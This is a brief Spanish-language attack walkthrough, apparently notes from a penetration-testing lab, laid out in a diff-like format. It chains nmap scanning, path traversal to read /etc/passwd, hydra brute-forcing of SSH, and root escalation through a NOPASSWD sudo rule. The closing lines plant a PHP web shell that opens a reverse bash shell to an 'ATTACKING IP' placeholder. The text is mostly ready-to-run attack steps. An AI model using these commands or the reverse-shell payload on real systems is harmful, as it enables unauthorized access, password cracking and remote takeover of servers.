@@ -1,0 +1,27 @@
+++ nmap <url>
+++ Identificar que ssh esté abierto
+++ Intentar conocer algún usuario vinculado al servidor mediante: <url.php?file=../../../../../etc/passwd>
+--- Nota: usuario con número >=999
+++ ssh <usuario>@<url>
+++ Ubicar el worldlist por default en kali o usar otro si se quiere
+--- usr/share/worldlists
+++ hydra -l <usuario> -P <worldlist> ssh://<url>
+++ Esperar a que el proceso pueda encontrar la contraseña  
+++ ssh <usuario>@<url>
+++ Ingresar la contraseña encontrada
+++ Podemos ejecutar comandos tales como:
+--- ls
+--- cd <directorio>
+++ En estos momentos tenemos acceso como usuario normal en el sistema
+++ El siguiente paso es tener acceso como root
+++ cd /var/www/html
+++ ls
+++ sudo -l (Verificar los permisos del usuario)
+++ Si al final está (ALL) NO PASSWD: ALL, ejecutar lo siguiente para ser root:
+++ sudo /bin/bash
+++ nano reverse.php 
+--- Incluir el siguiente código: <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
+--- Fuente: https://highon.coffee/blog/reverse-shell-cheat-sheet/
+++ Ctrl + X
+  
+
